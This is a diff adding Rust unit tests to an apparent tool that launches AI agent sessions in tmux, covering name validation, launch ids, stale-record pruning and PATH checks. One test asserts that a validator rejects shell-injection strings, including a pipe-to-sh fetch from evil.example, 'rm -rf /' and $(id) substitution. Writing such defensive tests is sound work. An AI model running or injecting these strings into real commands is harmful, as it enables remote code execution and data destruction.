@@ -161,3 +161,68 @@ pub(crate) fn spawn_launch_task<Fut>(
         do_spawn(task_id, port).await;
     });
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn shell_safe_accepts_realistic_model_and_agent_names() {
+        assert!(shell_safe("claude"));
+        assert!(shell_safe("codex"));
+        assert!(shell_safe("mlx-community/Qwen2.5-Coder-7B-Instruct-4bit"));
+        assert!(shell_safe("org/repo:tag+build"));
+    }
+
+    #[test]
+    fn shell_safe_rejects_shell_metacharacters() {
+        // These are exactly the shapes that would break out of the tmux `new-session` shell-command
+        // string built in `session_launch_route` (see ucc-session-launch-injection).
+        assert!(!shell_safe("codex; curl evil.example | sh"));
+        assert!(!shell_safe("codex `id`"));
+        assert!(!shell_safe("codex $(id)"));
+        assert!(!shell_safe("codex && rm -rf /"));
+        assert!(!shell_safe("codex\nrm -rf /"));
+        assert!(!shell_safe("has space"));
+        assert!(!shell_safe(""));
+    }
+
+    #[test]
+    fn next_launch_seq_is_monotonic_and_unique() {
+        // Two launches within one wall-clock second must get distinct ids; the seq is the tiebreaker.
+        let a = next_launch_seq();
+        let b = next_launch_seq();
+        let c = next_launch_seq();
+        assert!(a < b && b < c, "seq not strictly increasing: {a} {b} {c}");
+    }
+
+    #[test]
+    fn agent_record_starting_ttl_is_pruned_but_fresh_kept() {
+        // The prune predicate: a starting row past STARTING_TTL_SECS is dropped (dead launch task);
+        // a fresh one is kept. This mirrors the partition condition in live_agents/live_sessions.
+        let now = 1_000_000u64;
+        let fresh_ok = |started: u64, status: &str| {
+            status.starts_with("starting")
+                && now.saturating_sub(started) < STARTING_TTL_SECS
+        };
+        assert!(fresh_ok(now - 10, "starting…"), "fresh starting must be kept");
+        assert!(!fresh_ok(now - STARTING_TTL_SECS - 1, "starting…"), "stale starting must be pruned");
+        assert!(!fresh_ok(now - 10, "running"), "non-starting handled by other branches");
+    }
+
+    #[test]
+    fn missing_agent_is_refused_by_name_with_the_fix() {
+        // `sh` is on every PATH this can run on; the refusal must name the agent AND how to get it.
+        assert!(agent_on_path("sh"));
+        assert!(agent_missing_reason("sh").is_none());
+        assert!(!agent_on_path("rozum-no-such-agent-xyz"));
+        let why = agent_missing_reason("nadia-not-installed-xyz").expect("must refuse");
+        assert!(why.contains("nadia-not-installed-xyz") && why.contains("PATH"), "got: {why}");
+        assert!(agent_missing_reason("nadia").is_none() || agent_missing_reason("nadia").unwrap().contains("cargo install"));
+        // A path (not a bare name) is checked as given, not searched for on PATH.
+        assert!(agent_on_path("/bin/sh"));
+        assert!(!agent_on_path("/bin/definitely-not-here-xyz"));
+        // A directory is not a runnable agent.
+        assert!(!agent_on_path("/bin"));
+    }
+}
